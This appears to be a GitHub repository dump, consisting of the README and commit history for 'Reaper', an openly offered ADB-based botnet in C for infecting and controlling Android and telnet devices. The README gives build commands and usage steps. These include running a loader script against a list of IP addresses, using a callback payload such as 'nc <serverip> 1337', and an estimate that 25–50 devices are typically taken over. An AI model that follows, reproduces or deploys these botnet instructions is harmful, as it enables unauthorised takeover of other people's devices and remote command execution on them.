@@ -1,0 +1,188 @@
+======================: FILES :======================
+======================: README CONTENT :======================
+<h1 align="center">
+	<img src="https://static.thenounproject.com/png/4050176-200.png" width="150px"><br>
+    Reaper - An ADB-based botnet written in C.
+</h1>
+<p align="center">
+	Reaper is an ADB-based botnet that lets you control the devices you infect, execute commands, and contains extra tools for playing around. It isn't just limited 
+	to ADB, it can be used as a telnet botnet, or a regular botnet.
+</p>
+
+<p align="center">
+	<a href="https://deno.land" target="_blank">
+    	<img src="https://img.shields.io/badge/Version-1.0.0-7DCDE3?style=for-the-badge" alt="Version">
+</p>
+
+## Why?
+
+Here are few reasons why I made this:
+```
+- I wanted to learn more about botnets.
+- I wanted to make something that will help other people understand and learn more about botnets.
+- I wanted to make my own from scratch, because most botnets that are available on github are all variants of mirai or qbot.
+```
+Extra Facts:
+```
+- Yes, I know, I could've used epoll, but I didn't want to make things super-complicated and annoying.
+- No, this does not contain any DDoS methods, If you want to customize this and add your own, then you are free to do so.
+```
+
+## Installation
+```
+gcc -o reaper reaper.c -lpthread -lcurl
+gcc -o client client.c
+```
+
+## Usage
+After you have authenticated with the botnet and are waiting for connections, run this command -> `python3 loader.py droid.txt`. Make sure you have edited in your payload in the loader script. (It can be something as simple as `nc <serverip> 1337`) Wait around 5-15 minutes, and you should have devices connected. Even though the custom list I made is small and only has 96 IP's, on average, it pulls around 25 - 50 devices. Please remember, you don't have to limit yourself to only android devices, if you want to use a telnet list, it will also work.
+
+## Screenshots
+![Screenshot_2021-08-21-05-36-18_922x559](https://user-images.githubusercontent.com/86132648/130317740-f9882527-6632-4529-b776-dd224e7bc6ef.png)
+![Screenshot_2021-08-21-05-01-41_816x262](https://user-images.githubusercontent.com/86132648/130334806-4fe08963-f442-4104-bd5a-0f6c7b1b3741.png)
+
+## Credits
+```
+https://github.com/0x1CA3
+```
+### Contributions 🎉
+###### All contributions are accepted, simply open an Issue / Pull request.
+====================== GIT HISTORY: ======================
+21eb7ec HEAD@{0}: clone: from https://github.com/0x1CA3/Reaper
+commit 21eb7ec47809d321e4142cb38e65a6a04e4df819
+Author: 0x1CA3 <86132648+0x1CA3@users.noreply.github.com>
+Date:   Sun Aug 22 15:08:34 2021 -0400
+
+    Update README.md
+
+commit df3ec271e764a20c0879e416b881c3a4e4d6e48e
+Author: 0x1CA3 <86132648+0x1CA3@users.noreply.github.com>
+Date:   Sun Aug 22 13:18:22 2021 -0400
+
+    Add files via upload
+
+commit 775a411712c3580514d20483da4c70b9178c2c12
+Author: 0x1CA3 <86132648+0x1CA3@users.noreply.github.com>
+Date:   Sun Aug 22 13:17:56 2021 -0400
+
+    Add files via upload
+
+commit d13035aec5c6bf86962112557795a5683f174396
+Author: 0x1CA3 <86132648+0x1CA3@users.noreply.github.com>
+Date:   Sat Aug 21 17:08:49 2021 -0400
+
+    Update README.md
+
+commit 4ee8a7dff5989e4343b35511f05539a5e623e9aa
+Author: 0x1CA3 <86132648+0x1CA3@users.noreply.github.com>
+Date:   Sat Aug 21 15:55:12 2021 -0400
+
+    Add files via upload
+
+commit f24e9886db618c8adaae85867c5b082f4574b3d2
+Author: 0x1CA3 <86132648+0x1CA3@users.noreply.github.com>
+Date:   Sat Aug 21 13:50:07 2021 -0400
+
+    Update README.md
+
+commit c54cc1a04f7cbeef5d8b3f41edcb6c0771f003c3
+Author: 0x1CA3 <86132648+0x1CA3@users.noreply.github.com>
+Date:   Sat Aug 21 05:48:09 2021 -0400
+
+    Update README.md
+
+commit 260571c75444525a87e567a0c01ff707bd61c188
+Author: 0x1CA3 <86132648+0x1CA3@users.noreply.github.com>
+Date:   Sat Aug 21 05:45:40 2021 -0400
+
+    Update README.md
+
+commit 262feee3e3a46018ebf7ecd827275c1e57f2d0e5
+Author: 0x1CA3 <86132648+0x1CA3@users.noreply.github.com>
+Date:   Sat Aug 21 05:38:32 2021 -0400
+
+    Update README.md
+
+commit 2e75ab8250e9b75d08c7ba84156fbc246bd57c65
+Author: 0x1CA3 <86132648+0x1CA3@users.noreply.github.com>
+Date:   Sat Aug 21 05:30:24 2021 -0400
+
+    Add files via upload
+
+commit 72b06168cbf5ec441deb6749543708fb7af3d3c7
+Author: 0x1CA3 <86132648+0x1CA3@users.noreply.github.com>
+Date:   Sat Aug 21 05:26:57 2021 -0400
+
+    Add files via upload
+
+commit 9f1fd18fef02535207aac965fbeb16484c607c92
+Author: 0x1CA3 <86132648+0x1CA3@users.noreply.github.com>
+Date:   Sat Aug 21 05:26:21 2021 -0400
+
+    Add files via upload
+
+commit 9a152e0304b503a922fccea21fad84c664ab2496
+Author: 0x1CA3 <86132648+0x1CA3@users.noreply.github.com>
+Date:   Sat Aug 21 05:23:38 2021 -0400
+
+    Add files via upload
+
+commit 365115052111787d4e85172aded8e2e50a32e378
+Author: 0x1CA3 <86132648+0x1CA3@users.noreply.github.com>
+Date:   Sat Aug 21 05:20:53 2021 -0400
+
+    Update README.md
+
+commit 6bdaee067ec7e41067d7639cacae34dba931b8f9
+Author: 0x1CA3 <86132648+0x1CA3@users.noreply.github.com>
+Date:   Sat Aug 21 05:19:33 2021 -0400
+
+    Update README.md
+
+commit 5797a37af9f0a0190d614acbbbaf5b3f0beda99c
+Author: 0x1CA3 <86132648+0x1CA3@users.noreply.github.com>
+Date:   Sat Aug 21 05:18:46 2021 -0400
+
+    Update README.md
+
+commit 127f28e340ef8db5d9ee363e3076a211ff0933cb
+Author: 0x1CA3 <86132648+0x1CA3@users.noreply.github.com>
+Date:   Sat Aug 21 05:17:24 2021 -0400
+
+    Update README.md
+
+commit 5aa229c52e58823e76e3197853b637e8d09b0a12
+Author: 0x1CA3 <86132648+0x1CA3@users.noreply.github.com>
+Date:   Sat Aug 21 05:16:32 2021 -0400
+
+    Update README.md
+
+commit 3e7379fe45195b326342a59e2305d64b2473f268
+Author: 0x1CA3 <86132648+0x1CA3@users.noreply.github.com>
+Date:   Sat Aug 21 05:14:27 2021 -0400
+
+    Update README.md
+
+commit c5e1c9d0fac0e2504854f15de2abd65df81d36f5
+Author: 0x1CA3 <86132648+0x1CA3@users.noreply.github.com>
+Date:   Sat Aug 21 05:07:33 2021 -0400
+
+    Update README.md
+
+commit a6cedab42eef207dd4221a741d01cef07ec738b2
+Author: 0x1CA3 <86132648+0x1CA3@users.noreply.github.com>
+Date:   Sat Aug 21 05:06:37 2021 -0400
+
+    Update README.md
+
+commit 59c52fb38793a03a710aec925fb396e215fd77c4
+Author: 0x1CA3 <86132648+0x1CA3@users.noreply.github.com>
+Date:   Sat Aug 21 05:04:51 2021 -0400
+
+    Update README.md
+
+commit 13957c08def71446bbee6377a9059d333e79979d
+Author: 0x1CA3 <86132648+0x1CA3@users.noreply.github.com>
+Date:   Sat Aug 21 04:59:57 2021 -0400
+
+    Initial commit
